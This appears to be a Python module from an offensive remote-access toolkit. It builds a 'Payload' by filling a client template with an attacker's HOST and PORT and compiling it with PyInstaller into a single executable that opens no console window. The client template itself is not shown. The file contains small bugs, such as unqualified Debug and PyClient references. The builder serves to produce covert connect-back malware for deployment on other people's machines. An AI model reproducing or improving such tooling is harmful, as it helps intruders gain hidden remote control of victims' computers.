#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
This file is responsibel for creating the python and executabel Payload
'''

#TODO : Remove pyinstaller temporary workaround

__author__ = 'lorem.cookie'
__version__ = '0.2/alpha'

#Native Imports
import os

#Not native Imports
import subprocess #For pyinstaller workaround

#Custome Exceptions
class FileOnlyModule(Exception):
    def __init__(self):
        Exception.__init__(self, 'FILE IS ONLY A MODULE')
        
class ErrorOpeningOutdir(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR OPENING OUTPUT DIR')
        
class ErrorOpeningSampleClientFile(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR READING SAMPLE_CLIENT')
        
class PyClientAlreadyExists(Exception):
    def __init__(self):
        Exception.__init__(self,'PyClient ALREADY EXISTS')
        
class ErrorWritingPyClient(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR WRITING TO PyClient')

class Build:
    '''
    '''
    
    def __init__(self, HOST, PORT, OutputDir='OUT',SampleClient='SampleClient.txt',ClientName='client' ,Debug=False):
        
        self.HOST = HOST
        self.PORT = PORT
        self.OutputDir = os.path.join(os.getcwd(), OutputDir)
        self.SampleClient = os.path.join(os.getcwd(), 'modules', SampleClient)
        self.ClientName = ClientName
        self.PyDir = os.path.join(os.getcwd(), self.OutputDir, 'Py')
        self.PyClient = os.path.join(os.getcwd(), self.OutputDir, 'Py', self.ClientName + '.py')
        self.Debug = Debug
        
        if self.Debug:
            
            print('[INFO] Check if {} exists'.format(self.OutputDir))
            
        if os.path.isdir(self.OutputDir):
            
            if self.Debug:

                print('[INFO] {} Does exist'.format(self.OutputDir))
            
        else:

            if self.Debug:

                print('[WARNING] {} Does not exist'.format(self.OutputDir))
                print('[INFO] Creating {}'.format(self.OutputDir))
                
            try:
            
                os.mkdir(self.OutputDir)
        
            except FileExistsError:

                if self.Debug:

                    print('[ERROR] Error while creating {}'.format(OutputDir))
                    print('[WARNING] Exiting Program')

                raise ErrorOpeningOutdir
            
        if self.Debug:
            
            print('[INFO] Check if {} exists'.format(self.PyDir))
            
        if os.path.isdir(self.PyDir):
            
            if self.Debug:
            
                print('[INFO] {} Does exist'.format(self.PyDir))
            
        else:

            if self.Debug:

                print('[WARNING] {} Does not exist'.format(self.PyDir))
                print('[INFO] Creating {}'.format(self.PyDir))
                    
            try:
            
                os.mkdir(self.PyDir)
            
            except FileExistsError:

                if self.Debug:

                    print('[ERROR] Error while creating {}'.format(self.PyDir))
                    print('[WARNING] Exiting Program')

                raise ErrorOpeningOutdir
            
    def WritePy(self):
            
        try:
            
            with open(self.SampleClient, 'r') as f:
            
                sample_client_content = f.read().format(HOST=self.HOST, PORT=self.PORT)
                
        except (IOError, OSError):
        
            raise ErrorOpeningSampleClientFile
        
        if self.Debug:
            
            print('[INFO] Check if {} exists'.format(self.PyClient))
            
        if os.path.isfile(self.PyClient):
            
            if Debug:
            
                print('[ERROR] {} Already exists'.format(PyClient))
            
            raise PyClientAlreadyExists
    
        else:
        
            try:
            
                open(self.PyClient, 'w+').write(sample_client_content)
            
            except (IOError, OSError):
            
                raise ErrorWritingPyClient
    
    def CompileExe(self):
        
        # Temporary workaround
        # Temporary my ass
        subprocess.call('pyinstaller --onefile --noconsole --distpath {OUT} --workpath {OUT} --specpath {OUT} --clean {PyClient}'.format(OUT=self.OutputDir, PyClient=self.PyClient))

        # FIXME : Unrecognized argument : PyClient

        # PyInstaller.__main__.run([
            # '--onefile', #Create a one-file bundled executable
            # '--distpath {}'.format(OutputDir),
            # '--workpath {}'.format(OutputDir),
            # '--specpath {}'.format(OutputDir),
            # '--noconsole', #Opens no console
            # '--clean', #Removes all temporary files
            # PyClient,
        # ])

        if self.Debug:

            print('[INFO] Succesfully created and compiled Payload')
            
if __name__ == "__main__":
    
    raise FileOnlyModule